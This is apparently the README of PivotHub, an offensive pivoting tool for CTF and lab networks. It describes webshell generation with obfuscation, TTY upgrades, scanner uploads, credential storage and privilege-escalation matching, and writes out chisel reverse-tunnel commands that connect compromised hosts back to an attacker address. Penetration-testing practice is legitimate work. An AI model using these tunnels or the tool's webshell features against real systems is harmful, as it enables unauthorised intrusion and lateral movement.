# PivotHub · 链透中枢 — 多层内网渗透辅助工具

> 依据《多层内网渗透辅助工具 · 产品设计文档（PRD）v1.0》实现。
> 技术栈：**Vue 3（CDN 全局构建）+ ECharts 5（Graph 拓扑）+ 原生 CSS**，后端 **FastAPI + SQLite**。
> 数据全部来自本地后端：`python -m pivothub` 启动后，前端经 REST + WebSocket 读写 SQLite；
> 后端不可用时界面显式报错，不用假数据兜底。

---

## 1. 快速开始

### 启动（后端一体化托管前端）

```bash
pip install -r requirements.txt
python run.py            # 等价 python -m pivothub，监听 127.0.0.1:8000
```

浏览器打开 **http://127.0.0.1:8000/** 即可 —— 后端以 StaticFiles 原样托管前端，
`/api/*` 与 `/ws` 同源，无需另起静态服务器。

> 首次打开会弹出**合规声明**弹窗（PRD §5 合规要求），点击确认后进入面板。
> 数据全部来自本地后端（SQLite）；后端不可用时界面显式报错，不用假数据兜底。

### 前端资源已本地化（离线可用）

`index.html` 引用的是 `assets/vendor/` 下的 Vue 3 与 ECharts，**不依赖 CDN**，断网环境可直接使用；
ECharts 缺失时仅拓扑图降级，其余界面不受影响（`app.js` 另有 Vue 加载失败提示）。

### 纯前端调试

若只想调试界面，可用任意静态服务器打开本目录（如 `python -m http.server 8777`）；
但该端口没有 `/api` 与 `/ws`，面板会显式提示后端不可用。`.verify/` 自动化脚本默认目标是
正在运行的后端（`cdp-test.js` / `proxy-test.js` 用 `PH_URL` 覆盖，默认 `http://127.0.0.1:8033/`；
其余脚本写死 `http://127.0.0.1:8777/`）。

---

## 2. 目录结构

```
supershell/
├─ index.html                     # 前端骨架 + 全部 Vue 模板（<script type="text/x-template">）
├─ run.py  requirements.txt       # 一键启动 / 后端依赖
├─ pivothub/                      # 后端包（FastAPI + SQLite + WebSocket）
│  ├─ app.py  config.py  db.py  util.py  localinfo.py
│  ├─ api/                        # 路由层：projects hosts shells links creds flags
│  │                              #   timeline export recon stage tools attack
│  ├─ service/                    # 服务层：probe tty relay filestage recon
│  │                              #   statlib export timeline
│  ├─ session/                    # 会话层：base http_shell local reverse registry
│  ├─ adapters/                   # 适配器：chisel（已接入）+ base / registry 占位
│  ├─ models/  schemas/           # SQLAlchemy 模型 / Pydantic 接口契约
│  └─ ws/                         # WebSocket 连接管理
├─ assets/
│  ├─ css/                        # theme.css 设计令牌 · layout.css · components.css
│  ├─ vendor/                     # Vue 3 + ECharts 本地化（离线可用）
│  └─ js/
│     ├─ api.js                   # 后端 REST + WebSocket 客户端
│     ├─ store.js                 # 全局 store：状态 + 派生数据 + 全部业务动作
│     ├─ icons.js  topology.js  app.js  components/common.js
│     └─ views/                   # dashboard shell recon files generator proxy
│                                 #   asset cred flag timeline cheat export reverse db plugins
├─ data/                          # 插件数据：commands payloads tty_fixes privesc seed_project
│                                 #   plugins/（市场清单与已安装插件，安装内容不入库）
├─ tests/                         # 后端 pytest 用例
├─ scripts/                       # 靶场 Compose / 联调 / 防火墙脚本
├─ tools/                         # chisel / fscan 二进制（Adapter 部署与内网扫描用）
├─ .verify/                       # Chrome Headless + CDP 自动化测试脚本
├─ docs/                          # 架构 / 计划 / 进展 / 验证文档 + screenshots/
├─ 多层内网渗透辅助工具-产品设计文档.md   # PRD v1.0
├─ README.md
├─ PROJECT-STATUS.md  HANDOFF.md  PACKAGE-MANIFEST.md
└─ .gitignore
```

**约定**：模板集中在 `index.html`（便于阅读与 IDE 高亮），逻辑按视图拆分在 `assets/js/views/`，每个文件通过 `global.Components['xxx-view'] = {...}` 注册，`app.js` 统一挂载。

---

## 3. PRD 需求 → UI 落点对照

| PRD 编号 | 需求 | UI 落点 | 状态 |
|---|---|---|---|
| M1-1 | Webshell 生成器（PHP/JSP/ASP/ASPX + 混淆模板） | **马生成器** · 左侧参数区 + 右侧代码区，5 种混淆模板实时切换 | ✅ 可交互 |
| M1-2 | Shell 连接管理（登记/测试/心跳/断线标记） | **Shell 管理** · 表格 + 添加弹窗（含连通性测试按钮） | ✅ |
| M1-3 | 虚拟终端（命令/回显/历史/Tab 补全） | **Shell 管理** · 下方终端，支持 `↑↓` 历史、`Tab` 补全、复合命令；提示符随终端形态变化。**反弹会话自动进入原始交互模式**：直连目标 PTY，真实提示符原样显示、命令回显内联、长命令（ping/fscan）实时滚屏、交互程序（mysql/su/vim）可用；顶部有 `Ctrl+C` / `Tab` / `Ctrl+D` 与「获取 PTY」按钮 | ✅ |
| M1-4 | 文件管理（浏览/上传/下载/编辑） | **文件管理** · 独立视图：会话选择 + 路径跳转 + 文件表（大小/时间）+ 在线编辑 / 上传 / 下载；上传支持**两条通道**——① **HTTP 拉取**（攻击机起临时 HTTP 服务，目标机自动探测 curl/wget/python3/certutil 等自取，按字节数校验，避免分片在长链路超时/截断）② **分片直传**（原二进制安全分块），可选「自动」（拉取失败回退分片）；**Shell 管理** 右侧另有紧凑面板 | ✅ |
| M1-5 | 自定义马协议 + 基础信息自动回传入库 | 生成器「自定义加密马」选项 + 添加 Shell 的「自动回传」勾选 | ✅ |
| M1-6 | Shell 注入辅助（写马姿势速查 + 一键尝试） | **马生成器** · 底部 5 张写马卡片（SQL/日志/包含/SSTI/上传绕过） | ✅ |
| **M1-8** | **终端固化（WebShell 伪终端 → 稳定交互 TTY）** | **Shell 管理** · 终端面板右上角「终端固化」**弹窗**：交互能力检测 + 13 条技法库 + 一键执行固化 + stty raw 收尾 + 终端形态三态标记 | ✅ |
| M2-1 | 八款工具 Adapter 集成 | **代理编排台** · 工具下拉含 frp/nps/Neo-reGeorg/EW/Stowaway/Venom/chisel/ligolo-ng，每款独立命令模板 | ✅ |
| M2-2 | **出网探测 + 隧道推荐** | **代理编排台 ①** · ICMP/DNS/HTTP/TCP 四探针动画 + 结论/推荐/备选/理由 | ✅ |
| M2-3 | 两档自动化（半自动 / 自动档） | 顶栏档位开关 + 编排区勾选，自动档含上传→执行→回连→登记全流程与**失败降级** | ✅ |
| M2-4 | 多级串联编排 | 编排区自动继承上一层 Socks 入口，生成「串联参数」标签页 | ✅ |
| M2-5 | 统一 Socks 入口映射表 | **代理编排台 ④** · 本地端口 → 目标网段映射表 | ✅ |
| M2-6 | proxychains / msf 联动 | 顶栏两个按钮，生成配置并在面板内预览 | ✅ |
| M2-7 | 隧道类型覆盖 | 各工具模板区分 Socks5 / HTTP / 端口转发 / TUN | ✅ |
| M2-8 | 代理健康看板（延迟/流量/断链重拉） | **代理编排台 ④** · 状态点 + 延迟 + 流量 + 检查/重拉/销毁 | ✅ |
| M3-1 | 资产列表（原主机清单） | **资产列表**（作战组）· 表格 + 筛选 + 登记弹窗 + 扫描结果导入 + **移除**（级联清理该主机的会话 / 链路 / 凭据 / Flag） | ✅ |
| **M3-1+** | **资产探测（Shell 内网信息收集 + 扫描器扫内网）** | **资产探测** · ① `ip addr`/`ifconfig` + `/etc/hosts` + 路由 + ARP → ② 上传 fscan 类扫描器扫内网（内置轻量探测兜底；**暂存目录可自定义**、**上传后校验字节数**，截断的残file不会被当成缓存复用）→ ③ 勾选结果导入资产表 / 拓扑；扫描走**流式任务**，日志实时进「实时日志」面板与反弹 Shell 交互终端，可取消 | ✅ |
| M3-2 | **网络拓扑图（核心界面）** | **网络拓扑** · ECharts Graph，节点/边/详情侧栏/操作面板 | ✅ |
| M3-3 | 凭据库 + 复用推荐 | **凭据库** · 表格 + 右侧复用推荐（按网段/域/服务打分） | ✅ |
| M3-4 | 攻击路径 / 操作时间线 | **操作时间线** · 自动事件 + 手动笔记（Markdown） | ✅ |
| M3-5 | 网段管理 + 分区着色 | 拓扑按网段配色 + 右侧网段分区列表 | ✅ |
| M4-1 | Flag 收集墙 | **Flag 收集墙** · 卡片墙 + 进度环 + 阶段进度 + 一键复制提交 | ✅ |
| M4-2 | 内嵌 Markdown 笔记 | 时间线「添加笔记」+ Markdown 渲染 | ✅ |
| M4-3 | 比赛计时 / 阶段看板 | 顶栏倒计时 + **阶段看板**（已控主机/层级/Flag/剩余时间） | ✅ |
| M4-4 | Writeup 半自动生成 | **复盘导出** · MD/HTML/JSON 三格式 + 选项 + 实时预览 + 下载 | ✅ |
| M5-1 | 红队命令速查库 | **命令速查** · 6 大分类 + 搜索 + 变量替换 + 发送到终端 | ✅ |
| M5-2 | 智能建议：按当前主机 OS / 权限 / 内核版本推荐提权路径 | **命令速查** · 「提权智能匹配」：选会话 → 真实采集（内核 / sudo / SUID / capabilities / cron / 服务权限）→ 规则库命中（含内核 CVE 版本判断）→ 证据 + 建议命令可一键发送 | ✅ |
| M6-1 | SQLite 持久化 / 多项目 | 顶栏项目切换器 + 后端新建项目；数据落 SQLite | ✅ |
| M6-2 | 导出三格式 | **复盘导出** | ✅ |
| M6-3 | 项目导入/导出打包 | 复盘导出 · 「打包项目」按钮 | 🟡 界面就绪 |
| — | 合规声明（§5） | 启动弹窗 + 顶栏常驻入口 | ✅ |

---

## 4. 演示数据说明

空库首次启动时按 `data/seed_project.json` 播种一场**三层内网 CTF 演示项目**（库非空不会覆盖）：

| 层级 | 网段 | 主机 | 关键剧情 |
|---|---|---|---|
| VPN | `192.0.2.0/24` | 攻击机 `192.0.2.10`（tun0） | 通过 VPN 接入靶场网络，靶机回连到该地址 |
| L1 | `192.168.100.0/24` | web-dmz-01（双网卡 `192.168.100.2`/`10.85.101.3`） / web-dmz-02 / db-dmz | 任意文件上传拿入口马 → chisel 反向 Socks |
| L2 | `10.85.101.0/24` | app-int-01（双网卡 `10.85.101.4`/`172.56.102.4`） / app-int-02 / file-int | Tomcat war 部署、ASPX 马、SAM dump |
| L3 | `172.56.102.0/24` | DC01 / SRV-SQL / srv-ops | 域控、DCSync 拿域管哈希 |

- 5 个 Shell 会话（含 1 个断线示例、1 个已固化示例）
- 5 条代理链路，覆盖三种链路类型：**Socks 代理**、**单端口转发**、**多级中继**（含 1 条失败链路）
- 7 条凭据、5 个 Flag、17 条时间线事件、16 条命令模板、**13 条终端固化技法**

**推荐演示路径**：拓扑点节点 → 开终端 → **交互能力检测 → 执行 Python PTY → stty raw 收尾** → 出网探测 → 选跳板机 + 链路类型生成命令（切到 L2 双网卡机会自动推导多级中继）→ 切自动档一键部署（观察链路数 +1）→ 拓扑新增边 → 凭据库看复用推荐 → Flag 墙 → 导出 Markdown。

### 代理编排台的编排逻辑

**攻击机网络**：面板不再假设攻击机是 `127.0.0.1`。攻击机通过 VPN 接入靶场网络时，靶机必须回连到攻击机的**靶场网段地址**（本例 `192.0.2.10`），面板顶部可修改该地址与隧道监听端口，所有命令模板都用它替换。

**三种链路类型**（选跳板机后自动推荐，也可手动切换）：

| 类型 | 适用场景 | 生成的命令 |
|---|---|---|
| **Socks 代理** | 要访问某网段的**所有**资产 | `./chisel client 192.0.2.10:1331 R:0.0.0.0:10006:socks` |
| **单端口转发** | 只明确知道**某一个** `IP:端口` 服务 | `./chisel client 192.0.2.10:1331 R:0.0.0.0:10001:10.85.101.3:80` |
| **中继穿透（多级）** | 下层无法直连攻击机，需经上层内网口 | 见下方三步 |

**多级中继的自动推导**：选中 L2 双网卡机 `10.85.101.4` 时，面板识别出「该网段无法直连攻击机」+「该主机双网卡可通 L3」，于是自动：

1. 把链路类型切为「中继穿透」；
2. 目标网段取**第二块网卡**所在段 `172.56.102.0/24`（而不是它自己所在的段）；
3. 推导出中继入口地址 `10.85.101.3:1331`（上一层跳板在**本层网段**里的那个 IP）；
4. 生成三步命令并分步展示，每步可单独「发送到该节点终端」：

```bash
# ① 攻击机 192.0.2.10
./chisel server -p 1331 --reverse
# ② L1 入口机（把隧道端口暴露到内网口）
./chisel client 192.0.2.10:1331 1331:1331
# ③ L2 双网卡机（经内网口回连，穿透到 L3）
./chisel client 10.85.101.3:1331 R:0.0.0.0:10005:socks
```

拓扑图上的链路会按类型着色：Socks 绿色实线、多级中继紫色虚线、端口转发橙色实线、断开红色虚线。

---

## 5. 终端固化（TTY Upgrade）— M1-8

### 为什么必须有这一步

CTF / 靶场里拿到的绝大多数是**基于 Web 应用 RCE 落地的 WebShell**，本质是「一次 HTTP 请求 → 一次命令执行」的**伪终端（dumb shell）**：

- 没有控制终端（`tty` → `not a tty`）、没有 job control；
- `su` / `ssh` / `sudo -S` / `vim` / `top` / `mysql` 等交互程序直接不可用或花屏；
- 按 `Ctrl+C` 会中断马本身而不是当前前台程序；
- 方向键、退格、Tab 补全、窗口尺寸全部失效。

因此**把伪终端固化为稳定交互 TTY 是渗透流程的必经环节**，也是本工具把它提为 P0（PRD M1-8）的原因。

### 面板怎么用（三步闭环）

在 **Shell 管理** 中选中会话，点击终端面板右上角的 **「终端固化」按钮** 打开弹窗（弹窗左侧是状态与检测，右侧是技法库）：

1. **① 交互能力检测** — 自动执行 `tty` / `echo $TERM` / `stty size` / 工具探测，输出结论与可用工具（`python3` / `script` / `socat` / `nc`），终端形态从「伪终端」升级为「半交互」；
2. **② 选择技法并执行** — 每条技法标注**依赖工具 / 可靠性 % / 风险等级**，可「复制」「仅发送」「执行并固化」；执行后根据回显判定是否真正拿到 PTY，成功则标记「已固化 TTY」并写入时间线；
3. **③ Ctrl+Z → stty raw 收尾** — 拿到 PTY 后必做：`stty raw -echo; fg` + `reset` + `export TERM=xterm-256color`，恢复 `Ctrl+C`、退格、方向键与 `su`/`ssh` 交互。

> 弹窗只占屏幕中央，虚拟终端始终留在下方并**自动撑满剩余高度**（内部滚动），不会把页面顶高。

### 内置技法库（按目标平台自动切换）

**Linux（9 条）**：Python PTY（95%）、Python 导入式 PTY、`script -qc`（90%）、socat 全交互 PTY、nc+FIFO 反向交互、`bash -i` 半交互、环境变量修正、`Ctrl+Z → stty raw` 完整 TTY、`reset` 修复终端。

**Windows（4 条）**：PowerShell 交互会话、ConPTY 伪终端（Win10 1809+）、cmd 交互加固（chcp 65001）、WinRM 稳定会话。

技法库是**插件化数据**（`data/tty_fixes/*.json`），新增技法只需追加一条记录，面板自动渲染；命令中的 `$LHOST` / `$LPORT` / `$IP` / `$TARGET` / `$CRED` 会按当前会话上下文自动替换。

### 终端形态可视化

| 形态 | 提示符 | 标记 |
|---|---|---|
| 伪终端（dumb） | `$` | 红色「伪终端」 |
| 半交互（有回显无 TTY） | `user@host:/path$` | 橙色「半交互」 |
| 已固化（交互 TTY） | `[user@host] ~ #` | 绿色「已固化 TTY」 |

固化状态同步展示在 **Shell 管理表格** 的「终端形态」列，并随事件写入 **操作时间线**，最终进入导出的 Writeup。

---

## 6. 后端接口契约（FastAPI + WebSocket）

界面逻辑全部收敛在 `PivotStore`（`assets/js/store.js`），数据一律来自后端（无 mock 回退）。
下表即**当前已实现**的接口（`pivothub/api/`，共 72 个端点），字段契约以 `pivothub/schemas/` 为准。

### 6.1 REST 接口

| 方法 | 路径 | 说明 | 对应 store 动作 |
|---|---|---|---|
| GET | `/api/projects` | 项目列表 | `state.projects` |
| POST | `/api/projects` | 新建项目（干净工作区：仅攻击端本机节点，IP 取当前 `attack.ip`） | `createProject()` |
| DELETE | `/api/projects/{id}` | 删除项目（级联清理该项目的资产 / 会话 / 链路 / 凭据 / Flag / 时间线；至少保留一个项目） | `deleteProject()` |
| GET | `/api/projects/{id}/state` | 一次性拉取项目全量状态（`attack` / `segments` / hosts/links/shells/creds/flags/timeline） | `init()` |
| GET | `/api/attack` | 读攻击机网络 `{ip,segment,iface,note}` | `state.attack` |
| PUT | `/api/attack` | 写攻击机网络（所有回连命令与链路地址的唯一来源） | `saveAttack()` / 顶栏「全局设置」 |
| GET | `/api/netinfo` | 面板所在机器的 `{hostname, ips[]}`（攻击机地址自动检测，过滤回环/链路本地） | `netinfo()` |
| POST | `/api/shells/reverse/listen` | 攻击机侧开反弹监听（真实 socket；`bind` 缺省 127.0.0.1） | `reverseListen()` |
| GET | `/api/shells/reverse/listeners` | 监听与回连状态 | `reverseListeners()` |
| POST | `/api/shells/reverse/register` | 把已回连通道登记为会话（`kind=reverse`，复用会话层） | `reverseRegister()` |
| DELETE | `/api/shells/reverse/listeners/{id}` | 关闭单个监听（释放端口） | `reverseCloseListener()` |
| DELETE | `/api/shells/reverse/listeners` | 关闭全部监听（休眠 / 收尾清理残留端口） | `reverseCloseAll()` |
| POST | `/api/shells/{id}/io` | 反弹通道原始读写（交互式程序喂密码/读输出） | — |
| POST | `/api/shells/{id}/input` | **原始输入**：直接写目标 PTY（`data` 原文 / `key` = ctrl-c、ctrl-d、tab、enter…）；交互程序与长命令不再卡死 | `shellInput()` |
| POST | `/api/shells/{id}/raw` | 开关原始输出推送：打开后目标侧输出逐块经 WS `shell.output(kind=raw)` 推给终端（真实提示符原样显示），并**回放缓冲尾部**（连接横幅 / 首屏提示符，自动过滤哨兵标记） | `setRaw()` |
| GET | `/api/tools` | 读代理工具目录（含 `status=online\|offline` 与项目级 `enabled`） | `state.tools` / `toolOptions` |
| PUT | `/api/tools` | 写项目级启用集（只允许 `online` 工具；下线/未知工具 422） | `saveTools()` |
| POST | `/api/hosts` | 登记主机 | `addHost()` |
| POST | `/api/hosts/import` | 导入扫描结果 | `importScan()` |
| DELETE | `/api/hosts/{id}` | 移除资产（级联删除该主机的会话 / 链路 / 凭据 / Flag，时间线解绑保留；本机节点 400） | `removeHost()` |
| POST | `/api/recon/env` | 经会话收集网卡 / `/etc/hosts` / 路由 / ARP（分段解析） | 「资产探测」① 收集内网信息 |
| GET | `/api/recon/scanners` | 列出 `tools/` 内置扫描器（fscan 等，含平台/大小/默认模板） | 「资产探测」扫描方式=本地扫描器 |
| POST | `/api/recon/scan` | 上传扫描器（`localScanner` 走 tools/ 内置 / `scannerB64` 走上传，二进制安全、同名可跳过/强制重传；`remoteDir` 指定目标暂存目录）→ 执行 → 解析 fscan/nmap 输出 → 补抓 Web 标题 | 「资产探测」② 扫描内网（同步） |
| POST | `/api/recon/scan/stream` | **流式扫描**：立即返回 `jobId`，后台线程执行，逐行经 WS `recon.scan` 推送（同时镜像为 `shell.output` → 反弹会话交互终端实时可见）；反弹通道真流式，HTTP 马命令结束后一次性回放 | `reconScanStream()` |
| GET | `/api/recon/scan/jobs/{jobId}` | 扫描任务快照（状态 / 日志 / 结果，轮询兜底） | `reconScanJob()` |
| POST | `/api/recon/scan/jobs/{jobId}/cancel` | 取消扫描任务（向反弹通道发 Ctrl+C） | `reconScanCancel()` |
| POST | `/api/recon/import` | 扫描结果导入资产表（去重 / 自动分层 / 广播上拓扑） | 「资产探测」③ 导入选中 |
| POST | `/api/shells` | 登记 Shell 并连接 | `addShell()` |
| POST | `/api/shells/{id}/test` | 连通性测试 | `testShell()` |
| POST | `/api/shells/{id}/exec` | 执行命令 | `execCommand()` |
| POST | `/api/shells/{id}/tty/detect` | 交互能力检测（tty/TERM/stty/工具探测） | `detectTty()` |
| POST | `/api/shells/{id}/tty/upgrade` | 执行固化技法，返回是否拿到 PTY | `applyTtyFix()` |
| POST | `/api/shells/{id}/tty/finish` | stty raw 收尾 + reset | `runTtyFinish()` |
| GET | `/api/shells/{id}/files?path=` | 列目录 | `refreshFileEntries()` |
| POST | `/api/shells/{id}/files/upload` | 上传文件·分片直传（代理二进制部署依赖） | `upload()` |
| POST | `/api/shells/{id}/files/pull` | 上传文件·HTTP 拉取（攻击机临时 HTTP 暂存 → 目标机 curl/wget 等自取 + 字节数校验；可选 `tool` 强制工具、`host`/`port` 覆盖地址） | `upload()` |
| GET | `/api/shells/{id}/files/pull/tools` | 目标侧探测可用下载工具（curl/wget/python3/certutil/powershell/bitsadmin…） | `detectPullTools()` |
| GET | `/api/stage` · `DELETE /api/stage/{token}` | 查看 / 手动撤下攻击机 HTTP 暂存条目（拉取结束自动撤下） | — |
| POST | `/api/shells/{id}/probe` | 出网探测（真实执行 ICMP/DNS/HTTP/TCP） | `runDetect()` → `probeShell()` |
| GET | `/api/links/relay-plan?fromHostId=&listenPort=&localPort=` | 多级中继推导（relayAddr / targetSegment / 三步命令） | `relayPlan()` |
| POST | `/api/links/deploy` | 自动档部署（三种链路类型真实建立） | `deploy()` → `deployLink()` |
| POST | `/api/links` | 登记代理链路（隧道已真实建立，校验 pid 存活） | `deploy()`（半自动档） |
| POST | `/api/links/{id}/check` | 健康检查 | `testLink()` |
| POST | `/api/links/{id}/verify` | 隧道内真实性验证（连入口读目标服务回显） | — |
| POST | `/api/links/{id}/restart` | 重拉链路 | `restartLink()` |
| DELETE | `/api/links/{id}` | 销毁链路（逐层清理进程，记录保留用于复盘） | `stopLink()` |
| DELETE | `/api/links/{id}/record` | 删除链路记录（先按销毁流程结束进程，再从库/列表/拓扑移除；主机被移除时自动清理） | `removeLink()` |
| POST | `/api/creds` | 登记凭据 | `addCred()` |
| POST | `/api/flags` | 记录 Flag | `addFlag()` |
| POST | `/api/timeline/notes` | 添加笔记 | `addNote()` |
| GET | `/api/export?format=md\|html\|json` | 导出 | `buildMarkdown()` |
| GET | `/api/privesc/rules` | 提权规则库（`platform=linux\|windows` 可选过滤） | 「提权智能匹配」面板 |
| POST | `/api/shells/{id}/privesc/scan` | 采集目标事实并匹配提权路径（真实执行、只读，不自动利用） | `privescScan()` |
| GET / POST / DELETE | `/api/db/connections[...]` | 数据库连接 CRUD；`/test` 连通测试、`/query` 执行 SQL、`/tables` 库表列表 | 数据库面板 |
| GET / POST / DELETE | `/api/plugins[...]` | 插件清单（`/plugins`）、安装（`/{id}/install`）、启停（`/{id}/toggle`）、卸载（`DELETE /{id}`） | 插件市场 |

### 6.2 WebSocket 事件（`/ws`）

后端主动推送，前端按 `type` 分派即可实现实时刷新（完整清单见 `docs/ARCHITECTURE.md` §2）：

```json
{ "type": "shell.beat",     "shellId": "s-1", "alive": true, "latency": 24 }
{ "type": "shell.output",   "shellId": "s-1", "kind": "out", "line": "uid=33(www-data)" }
{ "type": "shell.tty",      "shellId": "s-1", "mode": "full", "hasPty": true, "term": "xterm-256color" }
{ "type": "shell.created",  "shell": { "...": "Shell" } }
{ "type": "probe.result",   "hostId": "h-l1-01", "probe": "TCP", "ok": true, "ms": 87 }
{ "type": "recon.scan",     "jobId": "scan-1", "status": "running", "kind": "out", "line": "..." }
{ "type": "attack.updated", "attack": { "ip": "192.0.2.10", "segment": "192.0.2.0/24", "iface": "tun0" } }
{ "type": "tools.updated",  "tools": [ { "name": "chisel", "status": "online", "enabled": true } ] }
{ "type": "link.state",     "linkId": "p-3", "status": "alive", "latency": 118, "traffic": "42.7 MB" }
{ "type": "link.created",   "link": { "...": "ProxyLink" } }
{ "type": "link.removed",   "linkId": "p-3", "projectId": "proj-1" }
{ "type": "host.found",     "host": { "...": "Host" } }
{ "type": "host.removed",   "hostId": "h-2", "projectId": "proj-1", "shellIds": [] }
{ "type": "timeline.push",  "event": { "...": "TimelineEvent" } }
{ "type": "project.removed","projectId": "proj-9" }
{ "type": "ws.online",      "online": true }
```

顶栏「WS 已连接/断开」指示器已接 `state.ws.online`。

### 6.3 数据模型（与 PRD §3.3 一致）

```
Project{id,name,startAt,durationSec}
Attack{ip,segment,iface,note}                              # 攻击机在靶场网络的地址（/state.attack）
Segment{segment,color,layer,count}                         # 与 data/meta.json 的 segmentColors 一致（含 VPN 段）
Tool{name,note,supports[],type,status(online|offline),enabled}   # 代理工具目录（/state.tools；MS4 仅 chisel=online）
Host{id,ip,hostname,os,layer,segment,privilege,owned,ports[],services[],note,discovery,isLocal,
     ifaces[{iface,ip,segment}],posX,posY}                 # ifaces = 双网卡（多级中继推导依据）
Shell{id,hostId,type,url,pass,encoder,alive,latency,lastBeat,hostname,privilege,stable}
ProxyLink{id,tool,linkType(socks|portfwd|relay),direction,fromHostId,toHostId,localSocks,
          targetSegment,status,latency,traffic,conf,createdBy,note,
          listenPort,remoteBind,localPort,targetHost,targetPort,relayAddr,relayPort,
          hops[{role,hostId,cmd}],pid,pids[{pid,role,hostId,port,cmd}]}
Credential{id,hostId,username,secret,kind,services[],reuse,source,time}
Flag{id,hostId,stage,value,submitted,time}
TimelineEvent{id,time,kind(shell|proxy|host|cred|flag|note),title,hostId,detail,cmd,markdown}
TtyFix{id,name,platform,target,needs[],reliability,risk,cmd,note,manual}   # 终端固化技法（M1-8）
```

`localSocks` 语义为 **`攻击机IP:端口`**（不再是 `127.0.0.1:端口`，字符串格式不变）；
`pids[]` 记录逐层进程（多级中继 = server/relay/target 三条），销毁时逐层清理。

`Shell.stable` 表示该会话是否已固化为交互 TTY；`ProxyLink.fromHostId → toHostId` 是有向边，拓扑图 = `Host` 节点 + `ProxyLink` 边的有向图 —— 这是 PRD 强调的「跳板链一等公民」数据根基。

**代理工具可见性（MS4 当前范围）**：`data/meta.json → tools` 是工具目录，`status=online` 表示适配器已接入（当前仅 chisel），`offline` 的工具在「代理工具设置」里显示为**下线**且不可启用；`Project.settings["tools"].enabled` 是项目级启用集，编排台的「隧道工具」下拉只显示已启用项。探测推荐 / 一键切换命中下线工具时自动回退到第一个已启用工具并提示。

---

## 7. 交互与快捷键

| 位置 | 操作 |
|---|---|
| 拓扑 | 拖拽节点调整布局；滚轮缩放；空白处点击取消选中；右侧面板 6 个快捷动作 |
| 拓扑布局 | 分层排布 / 链路放射 / 力导向 三种模式切换 |
| 虚拟终端 | 终端区**自动撑满**面板剩余高度（内部滚动，不会把页面顶高）；`Enter` 执行、`↑↓` 历史、`Tab` 补全；支持 `a; b; c` 与 `a \| b` 复合命令 |
| 终端固化 | 点终端面板右上角「终端固化」打开**弹窗**（左：状态/检测/收尾，右：技法库）；已固化的会话重复检测**不会降级** |
| 终端提示条 | 固定在终端面板最底部，点击命令 chip 直接填入 |
| 命令速查 | 「发送到终端」跨模块跳转并自动执行 |
| 全局 | `Ctrl/Cmd+C` 复制按钮走剪贴板 API（非安全上下文自动降级） |

---

## 8. 已验证情况

使用 Chrome Headless + CDP 自动化实测（脚本见 `.verify/`）：

- **12 个视图**全部渲染成功，**控制台 0 错误 0 警告**；
- 出网探测四探针 → 结论/推荐/备选完整输出；
- 自动档部署：链路数 `5 → 6`，拓扑边数同步 `+1`；
- **终端固化**：交互能力检测输出 `tty=not a tty / TERM=dumb / python3+script+socat+nc 可用` → Python PTY 执行后形态变为「已固化 TTY」、提示符切为 `[www-data@web-dmz-01] ~ #`、Shell 列表标记同步 → `stty raw` 收尾可点；Windows 会话自动切换为 4 条 Windows 技法；检测/固化事件写入时间线；
- **布局**：Shell 视图 `mainScrollable = 0`（终端提示条始终在视口内，无需拖动右侧滚动条），终端区实测 503px 且随窗口自适应；固化弹窗 1080×863 完整落在视口内、技法列表内部滚动；
- 终端复合命令、Tab 补全、历史回溯、文件上传进度、扫描导入（`10 → 12` 台主机）均正常；
- **上传双通道**：HTTP 拉取（攻击机临时 HTTP 服务 → 目标机探测 curl/wget/python3 等自取 → 按字节数校验）
  经 miniweb 靶真实下载逐字节一致；分片直传与「自动」降级同样可用（`tests/test_filestage.py`）；
- 凭据复用推荐输出 5 条、Flag 墙 6 张卡片、导出 Markdown 4679 字、JSON 预览正常；
- 12 个视图**无横向溢出**，1680×1050 与窄屏断点均正常。

复跑：`node .verify/cdp-test.js`、`node .verify/deep-test.js`、`node .verify/tty-test.js`。
先启动后端（面板自带 `/api` 与 `/ws`）：`cdp-test.js` / `proxy-test.js` 用 `PH_URL` 指向它
（默认 `http://127.0.0.1:8033/`）；其余脚本写死 `http://127.0.0.1:8777/`，可先以
`PIVOTHUB_PORT=8777 python run.py` 让后端监听该端口再跑。

---

## 9. 已知边界（当前实现）

- 数据持久化在本地 SQLite（`pivothub.db`，WAL）：面板重启后恢复；若库被清空，首次启动会按
  `data/seed_project.json` 重新播种演示项目；
- **凭据 / 口令 / Flag 全明文显示**（含导出报告，见 `docs/ASSUMPTIONS.md` A-23）：面板仅面向本机授权场景，
  对外分享 Writeup / JSON 前请自行删减敏感信息；
- Shell 执行 / 文件读写 / 出网探测 / 终端固化判定均为**真实执行**（经 `pivothub/session/` 会话层），
  后端不可用时显式报错，不用假数据兜底；
- **代理工具当前只接入 chisel**：`data/meta.json → tools[].status` 标记 `online` / `offline`，
  其余 7 款（frp / nps / Neo-reGeorg / EW / Stowaway / Venom / ligolo-ng）在「代理工具设置」里
  显示为**下线**且不可启用，编排台「隧道工具」下拉只显示已启用项（MS4 范围，见 `docs/ASSUMPTIONS.md` A-22）；
- 多级中继（relay）已实现三层串联与逐层进程清理；**断链自动重拉尚未实现**；
- **资产探测内置 fscan**：`tools/fscan_linux`（Linux 目标）与 `tools/fscan.exe`（Windows 目标）为
  fscan v2.2.1 官方发布包（sha256 与 release 的 `checksums.txt` 一致），扫描方式选「本地扫描器」
  即由面板自动上传到目标并执行，默认模板 `-h {SEGMENT} -p {PORTS} -nobr`（关爆破，只做端口/服务/标题）；
  输出兼容 fscan v1/v2、nmap（normal/grepable）与内置轻量探测，端口带服务名，Web 端口带页面标题
  （标题经目标侧 base64 回传，避免 webshell 字符集把中文变成 `?`）；
- **Windows 防火墙**：入站放行按可执行文件完整路径生效。正常使用时攻击机侧只有
  `tools\chisel.exe`（服务端）与 `python.exe`（反弹监听）需要放行；本机联调/测试时客户端会被
  上传到临时目录执行，路径每次都变会反复弹窗——`scripts/firewall-allow.ps1` 以管理员身份运行一次，
  即可清理历史遗留规则并放行这两个程序（本机联调已默认只绑 127.0.0.1，不再触发弹窗）；
- 终端固化在 Windows 靶机上诚实判定失败（无 Linux pty）；完整「检测→固化→收尾」成功路径
  需 Linux 靶机（`scripts/lab`，需 Docker 环境）；
- **上传「HTTP 拉取」需要目标机能回连攻击机**：暂存服务默认监听 `0.0.0.0` 随机端口
  （`PIVOTHUB_STAGE_BIND` / `PIVOTHUB_STAGE_PORT` / `PIVOTHUB_STAGE_TTL` 可调），只服务
  `/s/<随机 token>/<name>` 路径、条目 15 分钟过期、拉取结束即撤下；目标不可达时如实报错，
  用「自动」通道会自动回退分片直传；
